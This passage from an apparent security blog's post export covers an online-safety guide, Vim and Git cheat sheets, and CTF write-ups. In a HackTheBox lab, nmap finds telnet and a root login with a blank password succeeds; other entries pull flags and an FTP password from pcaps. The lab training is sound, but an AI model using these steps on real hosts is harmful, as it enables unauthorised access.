strong and easy-to-remember password Incorporate a variety of character types: Mixing letters, numbers, and special characters can make your password more secure. Avoid using personal information: Personal details like your name, address, and phone number are easier to guess and should be avoided in your password. Choose a longer password: Length is a key factor in password strength. Aim for a password that is at least 12 characters long. Consider using a password manager: A password manager can help you generate and store unique, secure passwords for all of your accounts, while only requiring you to remember a single master password. Use passphrases: Instead of a single word, consider using a short phrase as your password. This can be easier to remember and can also be stronger than a single word. For example, \"This is how t0 do !t\" is a strong passphrase that is easy to remember.Benefits of creating strong passwords Prevents account takeovers: If an unauthorized person is able to gain access to your accounts, they may be able to use your personal information for identity theft or fraudulent transactions. To protect yourself against this type of account takeover, it is important to use a strong password. Protects against unauthorized access: A strong password is harder for others to figure out and can keep your accounts and devices safe from unauthorized access. It’s important to make a password that is hard for other people to guess but easy for you to remember.Using different passwordUsing a different password for each of your online accounts is an important step in keeping yourself safe online. Here’s how it can help: Reduces the impact of a data breach: If one of the websites or services you use suffers a data breach and your password is exposed, an attacker could potentially use that password to gain access to your other accounts. By using a different password for each of your accounts, you can reduce the impact of a data breach on your overall online security. Makes it easier to manage your passwords: If you use the same password for multiple accounts, it can be difficult to remember them all. However, if you use a password manager to store your passwords, you can create strong, unique passwords for each of your accounts and only have to remember one master password. This makes it easier to keep track of your passwords and reduces the risk of forgetting them. Protects against password reuse attacks: If you use the same password for multiple accounts, an attacker who gains access to one of your accounts can try using the same password to gain access to your other accounts. This is known as a password reuse attack. By using a different password for each of your accounts, you can help protect yourself against this type of attack.Changing your password on a regular basisIn order to keep yourself safe online, it is essential to change your password on a regular basis. This can help you to protect yourself from cyber threats such as hacking and identity theft. As we rely more and more on the internet in today’s digital age, it is important to safeguard your personal information. One simple yet effective way to do this is by changing your password frequently. Here are some benefits of changing password regularly: Protects against password reuse attacks: If you use the same password for a long time, it may be possible for someone who gains access to one of your accounts to use that same password to gain access to your other accounts. This is because if an attacker gets hold of your password for one account, they may try using it on other accounts that you have. To help protect yourself against this type of attack, it’s a good idea to change your password on a regular basis. This way, even if an attacker does manage to get hold of one of your passwords, they will not be able to use it to access your other accounts. Makes it harder for someone to guess your password: Using the same password for a long time makes it easier for someone who has access to your personal information to guess your password. To make it harder for someone to guess your password, it is important to change your password regularly. This helps to increase the security of your accounts and protect your personal information from being accessed by unauthorized individuals. Reduces the impact of a data breach: If a website or service that you use experiences a data breach and your password is exposed, it’s possible that an attacker could use that password to access your accounts. To help protect yourself in the event of a data breach, it’s a good idea to change your password on a regular basis. This can help reduce the risk of an attacker being able to use any exposed passwords to compromise your online security.Never share your passwordIt is essential to keep your online accounts secure by never sharing your password with anyone. This simple step can go a long way in protecting your personal information and keeping yourself safe online. Here are some of the benefits of never sharing your password: Helps protect your personal information: Giving out your password to someone else could potentially grant them access to your private information and allow them to use it in ways that you may not have intended. In order to safeguard your personal information, it is crucial to keep your password confidential and not share it with anyone else. This will help protect you from unauthorized access to your accounts and data. Protects against unauthorized access: It is important to keep your password to yourself and not share it with anyone in order to prevent unauthorized access to your accounts and devices. This helps protect your personal information and keeps your accounts and devices secure. If someone else were to gain access to your password, they could potentially use it to access your accounts or devices without your permission, which could cause various types of harm or inconvenience. By not sharing your password, you can help ensure that only you have access to your accounts and devices, which can help keep you and your information safe.Software and AppsInstalling updates for your software and appsUpdating your softwares and apps is an important step in keeping yourself safe online. There are several benefits to doing so: Security fixes: Updates often include security patches that fix vulnerabilities that could be exploited by hackers. By keeping your software and apps up to date, you can protect yourself against these threats. New features: By installing updates as soon as they are available, you can ensure that you have the most current version of the software or app. This can help protect you against new threats that might be discovered after the initial release of the software or app. Improved privacy features: Updates often include new features and improvements that can make your software and apps more secure. For example, a new update might include a feature that helps protect your password or personal information. Enhanced performance: Updating your applications can also help improve its performance and speed. This can make your online experience more enjoyable and efficient. Keep your software and apps up to date to protect against vulnerabilities and improve security, performance, and privacy.Using latest anti-virus and firewall softwareTo keep your device safe while you’re online, it’s important to have the most current versions of antivirus and firewall software installed. These tools protect your device from viruses and other malware, as well as block unauthorized access to your system by acting as a shield between your device and the internet. Updating your antivirus and firewall software regularly ensures that you’re protected against the latest security threats and vulnerabilities. By taking this simple precaution, you can significantly reduce the risk of falling victim to online attacks and safeguard your personal information and data. Some benefits of using latest antivirus and firewall softwares are: Protects against malware infections: Antivirus software is a useful tool for protecting your device against malware infections. It works by detecting and removing malicious software that may be present on your device. By keeping your antivirus software up-to-date, you can increase the level of protection for your device. This is because new malware threats are constantly being developed, and it is important that your antivirus software is able to detect and remove these threats in order to keep your device safe and secure. Therefore, it is important to regularly update your antivirus software to ensure that it is able to protect your device against the latest malware threats. Enhances overall security: Proactive steps like installing the latest antivirus and firewall software can significantly improve the security of your device and reduce the risk of being attacked online. Keeping your security software up-to-date is crucial for protecting your device from a variety of threats, including viruses, malware, and unauthorized access. Protects against phishing attacks: Antivirus software can help protect against phishing attacks by blocking emails from known phishing websites and alerting the user if they visit a potentially harmful website. It’s important to keep antivirus software up to date to effectively detect and protect against cyber threats like phishing attacks. Regularly updating antivirus and firewall software helps protect against the latest security threats and vulnerabilities, enhances overall security, and guards against malware infections and phishing attacks. Keeping these tools current minimizes the risk of online attacks and better protects personal information and data.Fake EmailsBeware of fake websites and phishing emails! Some individuals are creating fraudulent websites and sending fake emails in an attempt to trick people into revealing sensitive information or downloading malware. To protect yourself, be cautious when clicking on links or entering personal information online. It’s a good idea to verify the authenticity of websites and emails before engaging with them.Spotting fake emails and websitesKnowing how to identify fake emails and websites is important for protecting your personal and financial information from cybercriminals. These scams can be sophisticated and may use familiar logos and branding to appear legitimate, but there are some telltale signs to look for. These are some of the signs to look for: Check the sender’s email address: If an email appears to be from a legitimate company, but the sender's email address is not recognized or seems suspicious, it could potentially be a fake email. Be cautious of unexpected emails or emails that contain urgent requests: Be cautious of emails from unfamiliar senders or companies you do business with that contain urgent requests or unexpected offers, as they may be fraudulent. Look for typos and poor grammar: If you come across an email or website with typos or poor grammar, it could be a sign that the company is not legitimate. Professional companies typically have well-written and error-free content in their emails and on their website. Be wary of links: To check the authenticity of an email link, hover your cursor over it to reveal the full URL. If the URL appears suspicious or unfamiliar, do not click on it. Check for secure websites: To ensure the security of your online browsing, pay attention to the \"https\" prefix in the URL and the presence of a lock icon in the address bar when visiting a website. While these indicators often indicate that a website can be trusted, it is important to note that not all https websites are necessarily trustworthy.Don’t click on strange-looking linksIn order to safeguard your personal information and computer, it is essential to avoid clicking on suspicious or unfamiliar emails, regardless of how convincing they may appear. Even if these emails seem too good to be true or come from unknown sources, it is best to trust your instincts and exercise caution. It is better to be safe than sorry, so make sure to take the necessary precautions to protect yourself online. Here is how it can help: Prevents malware infections: Clicking on strange or unfamiliar links can potentially expose your device to malware infections. To protect your device, it is important to avoid clicking on links that appear suspicious or unfamiliar. By taking this precaution, you can help prevent malware infections on your device. Protects against phishing attacks: Cybercriminals often try to obtain personal information by sending fake emails with links to fake websites, a tactic known as phishing. To protect yourself from falling victim to this type of attack, it is important to avoid clicking on links that seem suspicious or unfamiliar. Reduces spam: By clicking on unusual or unfamiliar links, you may be unknowingly signaling to the sender that your email is active, potentially leading to an increase in spam emails being sent to you. To decrease the amount of spam you receive, it is crucial to avoid interacting with these types of links. Protects your personal information: Clicking on unfamiliar or suspicious links can potentially expose your personal information or allow hackers to access your device. To safeguard your personal information, it is important to refrain from clicking on these types of links. To protect your personal and financial information, be cautious of fake emails and websites. Look for typos and poor grammar, be wary of links, and check for secure websites by looking for the “https” prefix and a lock icon in the address bar.Two-factor Authentication (2FA)Two-factor authentication (2FA), also referred to as two-step verification or dual-factor authentication, is an added security measure that requires users to verify their identity by providing two forms of authentication. Some benefits of using 2FA are: Increases the security of your accounts: Implementing two-factor authentication (2FA) can enhance the security of your accounts and minimize the likelihood of online attacks. Prevents account takeovers: Enabling two-factor authentication (2FA) can help prevent unauthorized access to your account, even if someone has obtained your password. 2FA adds an extra layer of security to your account, making it more difficult for attackers to take over. Prevents unauthorized access: Two-factor authentication (2FA) helps to secure your accounts by requiring a second form of identification in addition to your login credentials. This added layer of protection helps to prevent unauthorized access to your accounts.Backing-up your data regularlyRegularly backing up your data can help prevent data loss, protect against ransomware attacks, facilitate recovery from a cyberattack, and reduce the risk of data loss due to hardware failures. Select a reliable backup method and ensure that your backups are current to have the latest copies of your data.Educating your family membersTeaching your family about online safety is crucial for keeping them safe while using the internet. There are various aspects of online safety that you should teach your family, including how to recognize and avoid online scams and fraud, how to prevent and respond to cyberbullying, and how to protect their personal information online. It is important to have ongoing conversations about online safety and to keep your family informed about the latest online threats and best practices for staying safe online. By educating your family about online safety, you can help them make informed and responsible decisions while using the internet and protect them from potential online dangers." }, { "title": "VIM", "url": "/posts/Vim/", "categories": "Cheat sheet", "tags": "vim, vim script, vim configuration, vim plugins, coc", "date": "2022-12-11 00:00:00 +0300", "snippet": "How to turn Vim into a powerful and customizable IDEWhat is Vim? - Vim is a text editor that is commonly used by programmers for writing and editing code. It is known for its powerful features and ...", "content": "How to turn Vim into a powerful and customizable IDEWhat is Vim? - Vim is a text editor that is commonly used by programmers for writing and editing code. It is known for its powerful features and efficient navigation, which make it a popular choice among many developers.Benefits or advantages of using Vim as an IDE Efficient navigation: Vim uses a set of keyboard shortcuts for moving around and editing text, which can be more efficient than using a mouse. This allows users to work quickly and efficiently without having to take their hands off the keyboard. Powerful features: Vim has a large number of built-in features and plugins that allow users to customize their editor and add additional functionality. This includes syntax highlighting, code completion, and support for many different programming languages. Customizability: Vim is highly customizable, allowing users to configure their editor to suit their personal preferences and workflow. This includes setting keybindings, changing the color scheme, and adding plugins. Community support: Vim has a large and active community of users who share tips, tutorials, and plugins online. This makes it easy for users to learn how to use Vim and get help when they need it.Basics of setting up Vim as an IDEInstalling VimThere are several ways of how you can install Vim.a) Using package manager On Debian and LinuxMint └─$ sudo apt install vim On Arch Linux └─$ sudo pacman -S vim On Fedora └─$ sudo dnf install vim b) Installing from source Make sure you have this packages installed └─$ sudo apt-get install libncurses5-dev libperl-dev python-dev ruby-dev mercurial checkinstall lua5.2 liblua5.2-dev clone the vim source from github └─$ git clone https://github.com/vim/vim.git Then move to the vim directory └─$ cd vim Run this configure └─$ ./configure --prefix=/opt/vim \\ --enable-gui=no \\ --with-features=huge \\ --enable-perlinterp \\ --enable-pythoninterp \\ --enable-rubyinterp \\ --enable-luainterp \\ --enable-cscope compile and install └─$ make &amp;&amp; sudo make install Customizing Vim for your specific needsOn your home directory, create a file called .vimrc and this is the file which you will place your vim configuration. Setting to show line numbers set numberset relative number Setting backspace to behave normal. “Sometimes backspace doesn’t behave normal.” set bs=2 Make search to be case insesitive set hlsearchset incsearchset ignorecaseset smartcaseset nohlsearch \"This is to remove the highlighting after searching Setting compactibility mode to vim only set nocompatible Automatically wrap text that extends beyond the screen length set wrap set Encoding type to utf-8 set encoding=utf-8 To show status bar set laststatus=2 Automatic deletes trailing white spaces on save. (I don’t always use this because I use a plugin that shows me the whitespaces on runtime) autocmd BufWritepre * %s/\\s\\ set to change buffer without saving set hidden removing swapfiles set noswapfile view file folder stucture inoremap &lt;c-n&gt; &lt;Esc&gt;:Lex&lt;cr&gt;:vertical resize 30&lt;cr&gt;nnoremap &lt;c-n&gt; &lt;Esc&gt;:Lex&lt;cr&gt;:vertical resize 30&lt;cr&gt; Automatically closing braces inoremap { {}&lt;Esc&gt;hainoremap ( ()&lt;Esc&gt;hainoremap [ []&lt;Esc&gt;hainoremap \" \"\"&lt;Esc&gt;hainoremap ' ''&lt;Esc&gt;hainoremap ` ``&lt;Esc&gt;ha To disable the arrow keys My favorite noremap &lt;Up&gt; &lt;Nop&gt; noremap &lt;Down&gt; &lt;Nop&gt; noremap &lt;Left&gt; &lt;Nop&gt; noremap &lt;Right&gt; &lt;Nop&gt; remapping jj to be escape key imap jj &lt;Esc&gt; Customizing Vim for development Before starting we must set up a file we shall be using to install our plugins. For that case add this to your .vimrc file. Make sure you have created a file called .vimrc.plugfile On the .vimrc file call the .vimrc.plugfile if filereadable(expand(\"~/.vimrc.plug\")) source ~/.vimrc.plug endif On .vimrc.plugfile add:call plug#begin('~/.vim/plugged')\" All the plugins will be in between herecall plug#end()There are alot of plugins but here are some of the essential ones for developers. Ale - (Asynchronous Lint Engine) is a plugin providing linting (syntax checking and semantic errors) COC - Coc is an intellisense engine for VIM. Markdown-preview - Markdown Preview for (Neo)vim Setting up vim for python development …coming soon " }, { "title": "Meow", "url": "/posts/Meow/", "categories": "HackTheBox, Starting Point", "tags": "enumeration, telnet, penetration tester level 1, nmap, openvpn", "date": "2022-09-22 00:00:00 +0300", "snippet": "Connect to Starting Point VPN before starting the machine:└─$ sudo openvpn starting_point_YrnCollo.ovpnNmap results└─$ nmap -sV -sC -T4 10.129.57.107 Starting Nmap 7.92 ( https://nmap...", "content": "Connect to Starting Point VPN before starting the machine:└─$ sudo openvpn starting_point_YrnCollo.ovpnNmap results└─$ nmap -sV -sC -T4 10.129.57.107 Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-22 14:22 EATNmap scan report for 10.129.57.107Host is up (0.31s latency).Not shown: 996 closed tcp ports (conn-refused)PORT STATE SERVICE VERSION23/tcp open telnet Linux telnetd1057/tcp filtered startron3370/tcp filtered satvid-datalnk32770/tcp filtered sometimes-rpc3Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 64.21 secondsTask 1What does the acronym VM stand for?Answer: Virtual MachineTask 2What tool do we use to interact with the operating system in order to issue commands via the command line, such as the one to start our VPN connection? It’s also known as a console or shell.Answer: ShellTask 3What service do we use to form our VPN connection into HTB labs?Answer: openvpnTask 4What is the abbreviated name for a 'tunnel interface' in the output of your VPN boot-up sequence output?Answer: TunTask 5What tool do we use to test our connection to the target with an ICMP echo request?Answer: pingTask 6What is the name of the most common tool for finding open ports on a target?Answer: nmapTask 7What service do we identify on port 23/tcp during our scans?Answer: TelnetTask 8What username is able to log into the target over telnet with a blank password?Answer: root─$ telnet 10.129.57.107 1 ⨯Trying 10.129.57.107...Connected to 10.129.57.107.Escape character is '^]'. █ █ ▐▌ ▄█▄ █ ▄▄▄▄ █▄▄█ ▀▀█ █▀▀ ▐▌▄▀ █ █▀█ █▀█ █▌▄█ ▄▀▀▄ ▀▄▀ █ █ █▄█ █▄▄ ▐█▀▄ █ █ █ █▄▄ █▌▄█ ▀▄▄▀ █▀█Meow login: rootWelcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-77-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage System information as of Thu 22 Sep 2022 11:26:05 AM UTC System load: 0.0 Usage of /: 41.7% of 7.75GB Memory usage: 4% Swap usage: 0% Processes: 147 Users logged in: 0 IPv4 address for eth0: 10.129.57.107 IPv6 address for eth0: dead:beef::250:56ff:feb9:f05 * Super-optimized for small spaces - read how we shrank the memory footprint of MicroK8s to make it the smallest full K8s around. https://ubuntu.com/blog/microk8s-memory-optimisation75 updates can be applied immediately.31 of these updates are standard security updates.To see these additional updates run: apt list --upgradableThe list of available updates is more than a week old.To check for new updates run: sudo apt updateLast login: Mon Sep 6 15:15:23 UTC 2021 from 10.10.14.18 on pts/0root@Meow:~#Proof/flagsifconfigroot@Meow:~# ifconfigeth0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt; mtu 1500 inet 10.129.57.107 netmask 255.255.0.0 broadcast 10.129.255.255 inet6 dead:beef::250:56ff:feb9:f05 prefixlen 64 scopeid 0x0&lt;global&gt; inet6 fe80::250:56ff:feb9:f05 prefixlen 64 scopeid 0x20&lt;link&gt; ether 00:50:56:b9:0f:05 txqueuelen 1000 (Ethernet) RX packets 2663 bytes 196762 (196.7 KB) RX errors 0 dropped 0 overruns 0 frame 0 TX packets 1718 bytes 99654 (99.6 KB) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0lo: flags=73&lt;UP,LOOPBACK,RUNNING&gt; mtu 65536 inet 127.0.0.1 netmask 255.0.0.0 inet6 ::1 prefixlen 128 scopeid 0x10&lt;host&gt; loop txqueuelen 1000 (Local Loopback) RX packets 0 bytes 0 (0.0 B) RX errors 0 dropped 0 overruns 0 frame 0 TX packets 0 bytes 0 (0.0 B) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0Root flagroot@Meow:~# cat flag.txt b40abdfe****66***c61ecba***a4c19" }, { "title": "GIT", "url": "/posts/git/", "categories": "Cheat sheet", "tags": "git, github, Git configuration", "date": "2022-08-19 00:00:00 +0300", "snippet": " What is the Git terminal?At its core, Git is a set of command line utility programs that are designed to execute on a Unix style command-line environment. Modern operating systems like Linux and ...", "content": " What is the Git terminal?At its core, Git is a set of command line utility programs that are designed to execute on a Unix style command-line environment. Modern operating systems like Linux and macOS both include built-in Unix command line terminals. This makes Linux and macOS complementary operating systems when working with Git. Source: atlassian.comGetting started with git:If you are on any linux distro you can use the package management tool that comes with your distribution to install it.└─$ sudo apt install git-allGit configuration Setting up your username and email└─$ git config --global user.name \"your username\"└─$ git config --global user.email \"youremail@email.com\" Saving your git token locally└─$ git config --global credential.helper storeStarting a project└─$ git init└─$ git init &lt;directory&gt;└─$ git clone &lt;url&gt;Making changes Stage a single file └─$ git add &lt;file name&gt; Stage all files └─$ git add . Commit all staged files └─$ git commit -m \"your commit message\" To remove file from staged area └─$ git rm --cached \"file_name\" Remove file └─$ git rm &lt;file name&gt; Branches Creating new branch └─$ git branch \"branch_name\" Listing all local branches └─$ git branch -a Creating and switching to another branch └─$ git checkout -b \"branch_name\" Switching to another branch └─$ git checkout \"branch_name\" To delete/remove a branch └─$ git branch -d \"branch_name\" Deleting a branch whether merged or not └─$ git branch -D \"branch_name\" To push your branch └─$ git push --set-upstream origin \"branch_name\" Remote updates To list remotes └─$ git remote -v To show information └─$ git remote show \"remote_name\" To add remote └─$ git remote add \"path/url\" To fetch changes from remote repo(no merge) └─$ git fetch \"remote_name\" To fetch from specific branch └─$ git fetch \"remote_name\" \"branch_name\" To fetch and merge └─$ git pull \"remote_name\" \"branch_name\" To push local to remote └─$ git push \"remote_name \"branch_name\" To delete remote branch └─$ git push remote :branch Merging To merge into current branch └─$ git merge \"branch_name\" Merge tool to resolve conflicts └─$ git mergetool Rebase into branch └─$ git rebase \"branch_name\" Pulling and pushing Upload all staged files └─$ git push Upload content to remote └─$ git push \"remote_name\" Upload to a branch └─$ git push \"remote_name\" \"branch_name\" Fetch and merge remote repo’s copy └─$ git pull To move your local changes to the latest changes made to remote repo(rebase) └─$ git pull --rebase \"remote_name\" " }, { "title": "CyberTalents Bootcamp 2022", "url": "/posts/CyberTalents_Bootcamp/", "categories": "Bootcamp, Cybertalent", "tags": "wget, wireshark, strings, base64, curl, rot13, Kali linux, forensics, steganography, exiftool, steghide, stegcracker, cyberchef, audacity", "date": "2022-08-08 00:00:00 +0300", "snippet": "This is CyberTalents Bootcamp(Online)2022 challenges.Introduction to CTFCompetitionDescription: Special kind of cybersecurity competition designed to challenge its participants to solve computer se...", "content": "This is CyberTalents Bootcamp(Online)2022 challenges.Introduction to CTFCompetitionDescription: Special kind of cybersecurity competition designed to challenge its participants to solve computer security problems.solution: ctfCybersecurity OverviewfisherDescription: What is the job match the below definition?Individuals who know the nuts and bolts of cybersecurity and are well versed in finding flaws and vulnerabilities. There are various bug bounty platforms that allow them to be paid to find vulnerabilities in applications and software.Flag format: flag{xxx xxxxxx xxxxxx}Solution: This challenge doesn’t need alot of explanation. You can do other research on bug bounty hunterflag{bug bounty hunter}Attacks &amp; VulnerabilitiesMailerDescription: we got the evidence for the phishing Email but we need to know the name of malware fileflag format flag{}Solution:We shall use wget to download the file we are given.wget https://hubchallenges.s3-eu-west-1.amazonaws.com/Forensics/mail_bak.7zOnce downloaded we shall unzip the mail_bak.7z by use of 7z└─$ 7z x mail_bak.7z7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21p7zip Version 16.02 (locale=en_US.UTF-8,Utf16=on,HugeFiles=on,64 bits,4 CPUs Intel(R) Core(TM) i5-4210U CPU @ 1.70GHz (40651),ASM,AES-NI)Scanning the drive for archives:1 file, 235694 bytes (231 KiB)Extracting archive: mail_bak.7z--Path = mail_bak.7zType = 7zPhysical Size = 235694Headers Size = 177Method = LZMA2:3mSolid = +Blocks = 1Everything is OkFiles: 2Size: 2714896Compressed: 235694We have sent and inbox files. We need to know the name of malware file which was sent so we shall cat the contents of sent and grep .exe file extension.└─$ cat Sent | grep .exe&gt; ctbank.com/Mal_strike8941934890753353453.exe&gt; &lt;http://ctbank.com/Mal_strike8941934890753353453.exe&gt;&gt;&gt; www.ctbank.com/Mal_strike8941934890753353453.exe&gt;&gt; &lt;http://www.ctbank.com/Mal_strike8941934890753353453.exe&gt; href=\"http://ctbank.com/Mal_strike8941934890753353453.exe\"&gt;ctbank.com/Mal_strike8941934890753353453.exe&lt;/a&gt;&lt;br&gt; href=\"http://www.ctbank.com/Mal_strike8941934890753353453.exe\"&gt; Account director Evan Russack becomes the No. 2 digital exec&gt; appointment of Evan Russack to executive director of digital. Russack, digital exec&lt;/span&gt; executive director of digital.Subject: Re: BREAKING: Nasdaq drops another 1.3% Friday, other major indexes &lt;td&gt;How C-suite execs have shifted theirgrep: (standard input): binary file matchesAwesome, we have the name of the file which is Mal_strike8941934890753353453.exe and that’s our flag.flag{Mal_strike8941934890753353453.exe}Network Security FundamentalsMaskDescription: What is the subnet mask for this host?Solution We can clearly see the subnet mask is 255.255.255.0 and that’s our flag.Wiresharkcl34rDescription: Can You see the password clearlySolution:We shall use wget to download the file.wget https://hubchallenges.s3.eu-west-1.amazonaws.com/Forensics/cl34r.pcapngOnce opened on wireshark we can clearly see some movement of packets.Let’s follow the GET request on /login.php packetThere we can see the flag but it is url encoded.We shall use cyberchef to decode the url encoded string.Awesome we have our flag flag{Th1s_15_t0_cl34r}AnonymousDescription: Can you trace the anonymous guy?Solution:We shall use wget to download the file.└─$ wget https://hubchallenges.s3-eu-west-1.amazonaws.com/Forensics/anonymous.pcapLet’s use the strings to see if we can get something out of it└─$ strings -n 10 anonymous.pcap 220 pyftpdlib 1.5.4 ready.USER anonymoys331 Username ok, send password.PASS anonymous530 Authentication failed.215 UNIX Type: L8PORT 192,168,0,164,179,157530 Log in with USER and PASS first.530 Log in with USER and PASS first.PORT 192,168,0,164,179,158530 Log in with USER and PASS first.220 pyftpdlib 1.5.4 ready. CKAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA CKAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAUSER anonymous331 Username ok, send password.PASS anonymous230 Login successful.215 UNIX Type: L8PORT 192,168,0,164,181,46200 Active data connection established.125 Data connection already open. Transfer starting.drwxrwxrwt 2 root root 4096 Mar 11 18:29 .ICE-unixdrwxrwxrwt 2 root root 4096 Mar 11 18:29 .Test-unixdrwxrwxrwt 2 root root 4096 Mar 11 18:29 .X11-unixdrwxrwxrwt 2 root root 4096 Mar 11 18:29 .XIM-unixdrwxrwxrwt 2 root root 4096 Mar 11 18:29 .font-unix-rw-r--r-- 1 root root 37 Mar 11 18:35 flag.txtdrwx------ 3 root root 4096 Mar 11 18:29 systemd-private-554f9bdfbd734f3b8cac1440e18753dc-apache2.service-Rsquyfdrwx------ 3 root root 4096 Mar 11 18:29 systemd-private-554f9bdfbd734f3b8cac1440e18753dc-systemd-logind.service-nXcWehdrwx------ 3 root root 4096 Mar 11 18:29 systemd-private-554f9bdfbd734f3b8cac1440e18753dc-systemd-resolved.service-8ajXRf226 Transfer complete. CKAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA CKAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA CKAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA CKAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA200 Type set to: Binary.PORT 192,168,0,164,182,186200 Active data connection established.RETR flag.txt125 Data connection already open. Transfer starting.ZmxhZ3thbm9ueW1vdXNfdDBfdGgzX2VuZH0=226 Transfer complete.Well as we can see we have a base64 string their and we have to decode it.└─$ echo \"ZmxhZ3thbm9ueW1vdXNfdDBfdGgzX2VuZH0=\" | base64 -dflag{anonymous_t0_th3_end}Awesome we have our flag: flag{anonymous_t0_th3_end}OSI ModelhttpDescription: start the server and you will be able to reach the flag on ctweb.com?username: ctfpassword: ctfSolution: The first thing is to start the challenge and you are given a web shell. We shall use curl to see what’s on ctweb.com.ctf@wlem4m2366qcg3011y3e1e0sxzm61y3eq89pbx3m-web-5949f4679f-srh8v:~$ curl ctweb.com 6 ⨯&lt;!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Transitional//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\"&gt;&lt;html xmlns=\"http://www.w3.org/1999/xhtml\"&gt; --&gt; &lt;head&gt; &lt;meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\" /&gt; &lt;title&gt;access /fl4g.html directory to get your flag&lt;/title&gt; &lt;/head&gt; &lt;/html&gt;ctf@wlem4m2366qcg3011y3e1e0sxzm61y3eq89pbx3m-web-5949f4679f-srh8v:~$We shall navigate to /fl4g.html directory so as we get the flag and we shall use curl again.ctf@wlem4m2366qcg3011y3e1e0sxzm61y3eq89pbx3m-web-5949f4679f-srh8v:~$ curl ctweb.com/fl4g.htmlflag{htt9_pR0toc01}ctf@wlem4m2366qcg3011y3e1e0sxzm61y3eq89pbx3m-web-5949f4679f-srh8v:~$Awesome we have our flag flag{htt9_pR0toc01}addressDescription: (What is the source and destination IP/MAC for packet number 258 Mac address in small letters.)Flag format: flag{Source IP/Source MAC/Destination IP/Destination MAC}Solution: This was fairly simple challenge and all you were required to do is load the pcapng file to wireshark and check packet number 258.Use wget to download the file.└─$ wget https://hubchallenges.s3.eu-west-1.amazonaws.com/foren/Wireshark101.pcapngWe have all the information. We shall get all the information required by the challenge i.e IP/source MAC/Destination IP/Destinationflag: flag{40.77.226.250/38:54:9b:31:db:b8/192.168.1.4/08:00:27:ba:8c:38}Network ProtocolbflagDescriptionAll of us started from the bottom. Now it’s your turn.Solution:For this challenge we have to analyze the http traffic packets by right clicking &gt; follow &gt; tcp stream.GET /f14g/analyze_packet_for_fun HTTP/1.1Host: www.aldabaknocking.comUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:67.0) Gecko/20100101 Firefox/67.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflateConnection: keep-aliveCookie: _ga=GA1.2.1907807868.1562271214; _gid=GA1.2.418247249.1562271214; _gat=1Upgrade-Insecure-Requests: 1HTTP/1.1 404 Not FoundDate: Thu, 04 Jul 2019 20:14:16 GMTServer: ApacheContent-Length: 344Keep-Alive: timeout=2, max=100Connection: Keep-AliveContent-Type: text/html; charset=iso-8859-1&lt;!DOCTYPE HTML PUBLIC \"-//IETF//DTD HTML 2.0//EN\"&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;404 Not Found&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;Not Found&lt;/h1&gt;&lt;p&gt;The requested URL /f14g/analyze_packet_for_fun was not found on this server.&lt;/p&gt;&lt;p&gt;Additionally, a 404 Not Founderror was encountered while trying to use an ErrorDocument to handle the request.&lt;/p&gt;&lt;/body&gt;&lt;/html&gt;By following stream 86 you’ll find analyze_packet_for_fun was not found on this server and trying analyze_packet_for_fun it was the correct flag.ADAMINDescription: Admin of FTP server is spoofed fetching employers data, pcap attached of victim activitySolution: We shall start by downloading the files└─$ wget https://hubchallenges.s3.eu-west-1.amazonaws.com/Forensics/ADAMIN.pcapWe shall filter by ftp-data We have two packets and one has salaries.zip content. We shall follow tcp stream and save the raw contentLet’s unzip the salaries.zip file which we saved earlier.It seems it is password protected. Let’s search for the password on the pcap file. We shall filter by ftp and we can see clear password which is oneforallpass.Let’s unzip again the file supplying the password.We have two files .ADAM.txt and Salaries.csv.tar.xz. Well if we open the ADAM.txt file we have the flag.Flag: flag{0ne_4_aLL_pa$$}MAKDescription:Given wireshark capturing file. What is the MAC address of the gateway router?flag in format : flag{MAC address}Solution:We shall download the file which we are given.└─$ wget https://hubchallenges.s3.eu-west-1.amazonaws.com/networkessentials/MAK.pcap.zipAfter that unzip the file which we have downloaded└─$ unzip MAK.pcap.zipArchive: MAK.pcap.zip inflating: MAK.pcapWe shall then open the pcap file in wireshark and navigate to statistics &gt; endpoints &gt; IPv4.10With that we can see 10.0.0.1 is the first IP address meaning its the default gate way.839\t19.478289\tNetgear_67:ea:76\t\tARP\t62\tWho has 10.0.0.21? Tell 10.0.0.1We are required to get the MAC address.Linux cooked capture v1 Packet type: Unicast to us (0) Link-layer address type: Ethernet (1) Link-layer address length: 6 Source: Netgear_67:ea:76 (a4:2b:8c:67:ea:76) Unused: 9a9e Protocol: ARP (0x0806) Padding: 00000000000000000000000000000000 Trailer: 0000Well we have the MAC address…flag: flag{a4:2b:8c:67:ea:76}Data Encodingkeep ASCIIngDescription:One form of string representations is readable but the other is not. Can you read the flag. 102108097103123067084095049115116069097115121083051099114051116051080064115115112104114052053051125 Flag format is FLAG{XXXXXXXXXX}Solution:This challenge is so simple. Find a asci to text converter and you can use this site. If you have time you can use asci table and convert one by one till you form the flag.flag: flag{CT_1stEasyS3cr3t3P@ssphr453}Data EncryptionHide DataDescription:I used to hide my data with a classic cypher, can you get the flag hidden inside? gur synt vf 2w68lsudym Vg vf cerggl rnfl gb frr gur synt ohg pna lbh frr vg v gbbx arneyl 1 zvahgr gb rapbqr guvf jvgu EBG13 tbbq yhpx va fbyivat gungSolution: Well I used Cyberchef 